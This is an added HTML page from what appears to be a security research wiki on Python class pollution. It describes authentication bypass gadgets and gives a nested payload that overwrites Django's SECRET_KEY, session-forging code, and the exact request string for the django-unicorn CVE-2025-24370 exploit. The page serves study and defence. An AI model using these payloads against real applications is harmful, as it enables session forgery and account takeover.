@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auth Bypass Gadgets | Python Class Pollution</title>
+    <link rel="stylesheet" href="/wiki/css/wiki.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+<body>
+    <div class="wiki-layout">
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <a href="/">Class Pollution Wiki</a>
+            </div>
+            <ul class="sidebar-nav">
+
+
+    
+    <li>
+        <a href="/wiki/docs/taxonomy/" >Taxonomy</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/taxonomy/primitives/" >Pollution Primitives</a></li>
+            
+            <li><a href="/wiki/docs/taxonomy/types/" >Vulnerability Types</a></li>
+            
+            <li><a href="/wiki/docs/taxonomy/consequences/" >Consequences</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/targets/" >Pollution Targets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/targets/classes/" >Classes</a></li>
+            
+            <li><a href="/wiki/docs/targets/modules/" >Modules</a></li>
+            
+            <li><a href="/wiki/docs/targets/functions/" >Functions</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/gadgets/" >Gadgets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/gadgets/rce/" >RCE Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/xss/" >XSS Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/dos/" >DoS Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/auth-bypass/" class="active">Auth Bypass Gadgets</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/tool/" >Tool</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/tool/pyrl/" >Pyrl</a></li>
+            
+            <li><a href="/wiki/docs/tool/polluter/" >Polluter</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/collection/" >Collection</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/collection/showcases/" >Showcases</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/defense/" >Defense</a>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/reference/" >Reference</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/reference/cve-index/" >CVE Index</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/faq/" >FAQ</a>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/history/" >History</a>
+        
+    </li>
+    
+
+</ul>
+
+        </nav>
+        <main class="content">
+            
+<article>
+    <h1 id="authentication-bypass-gadgets">Authentication Bypass Gadgets</h1>
+<p>Authentication bypass gadgets allow attackers to forge credentials, escalate privileges, or bypass security checks.</p>
+<h2 id="gadget-1-django-secret_key-overwrite">Gadget 1: Django SECRET_KEY Overwrite</h2>
+<p><strong>Mechanism</strong>: Django uses <code>SECRET_KEY</code> to sign session cookies, CSRF tokens, and password reset tokens. If the attacker can overwrite this key with a known value, they can forge valid sessions for any user.</p>
+<p><strong>Key Path</strong>:</p>
+<pre tabindex="0"><code>__init__.__globals__.sys.modules.django.template.backends.django.settings.SECRET_KEY
+</code></pre><p>or:</p>
+<pre tabindex="0"><code>__init__.__globals__.sys.modules.django.conf.settings.SECRET_KEY
+</code></pre><p><strong>Value</strong>: <code>&quot;13371337&quot;</code> (any attacker-known string)</p>
+<p><strong>Effect</strong>:</p>
+<ol>
+<li>Attacker knows the SECRET_KEY</li>
+<li>Attacker forges a session cookie for any user (including admin)</li>
+<li>Server validates the forged cookie (signature matches)</li>
+<li>Attacker is authenticated as any user</li>
+</ol>
+<h3 id="exploitation-steps">Exploitation Steps</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># 1. Pollute SECRET_KEY</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;__class__&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;__init__&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;__globals__&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;sys&#34;</span>: {
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;modules&#34;</span>: {
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;django&#34;</span>: {
+</span></span><span style="display:flex;"><span>                            <span style="color:#e6db74">&#34;conf&#34;</span>: {
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">&#34;settings&#34;</span>: {
+</span></span><span style="display:flex;"><span>                                    <span style="color:#e6db74">&#34;SECRET_KEY&#34;</span>: <span style="color:#e6db74">&#34;attacker_key&#34;</span>
+</span></span><span style="display:flex;"><span>                                }
+</span></span><span style="display:flex;"><span>                            }
+</span></span><span style="display:flex;"><span>                        }
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. Forge session cookie using known key</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> django.core.signing <span style="color:#f92672">import</span> Signer
+</span></span><span style="display:flex;"><span>signer <span style="color:#f92672">=</span> Signer(key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;attacker_key&#34;</span>)
+</span></span><span style="display:flex;"><span>forged_session <span style="color:#f92672">=</span> signer<span style="color:#f92672">.</span>sign(admin_session_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. Send request with forged cookie, authenticated as admin</span>
+</span></span></code></pre></div><h2 id="gadget-2-flask-secret_key-overwrite">Gadget 2: Flask SECRET_KEY Overwrite</h2>
+<p><strong>Mechanism</strong>: Same concept as Django — Flask uses SECRET_KEY for session signing.</p>
+<p><strong>Key Path</strong> (application-specific):</p>
+<pre tabindex="0"><code>__init__.__globals__.app.secret_key
+</code></pre><p><strong>Value</strong>: <code>&quot;attacker_known_key&quot;</code></p>
+<p><strong>Effect</strong>: Attacker can forge Flask session cookies.</p>
+<h2 id="gadget-3-authentication-flag-overwrite">Gadget 3: Authentication Flag Overwrite</h2>
+<p><strong>Mechanism</strong>: Some applications store authentication state in class or module variables that can be polluted.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AuthMiddleware</span>:
+</span></span><span style="display:flex;"><span>    require_auth <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>  <span style="color:#75715e"># Class variable</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># After pollution: AuthMiddleware.require_auth = False</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># All requests bypass authentication</span>
+</span></span></code></pre></div><h2 id="gadget-4-rolepermission-escalation">Gadget 4: Role/Permission Escalation</h2>
+<p><strong>Mechanism</strong>: If user roles or permissions are resolved from class attributes or module-level configs:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">UserPermissions</span>:
+</span></span><span style="display:flex;"><span>    default_role <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;user&#34;</span>
+</span></span><span style="display:flex;"><span>    admin_endpoints <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;/admin&#34;</span>, <span style="color:#e6db74">&#34;/settings&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># After pollution: UserPermissions.default_role = &#34;admin&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># New users get admin role by default</span>
+</span></span></code></pre></div><h2 id="real-world-example-django-unicorn-cve-2025-24370">Real-World Example: django-unicorn (CVE-2025-24370)</h2>
+<p>In django-unicorn, the <code>settings</code> module is reachable through the class pollution traversal:</p>
+<ol>
+<li>The <code>set_property_value</code> function processes WebSocket messages without validating the key path</li>
+<li>An attacker sends: <code>name=__class__.__init__.__globals__.sys.modules.django.conf.settings.SECRET_KEY&amp;value=pwned</code></li>
+<li>Django&rsquo;s SECRET_KEY is overwritten</li>
+<li>Attacker forges admin session cookie using the known key</li>
+<li>Full authentication bypass achieved</li>
+</ol>
+
+Authentication bypass via SECRET_KEY pollution is particularly dangerous because:
+- It's **silent** — no failed login attempts in logs
+- It's **universal** — works for any user account
+- It's **persistent** — until the key is rotated or the server restarts
+
+
+
+</article>
+
+        </main>
+    </div>
+</body>
+</html>
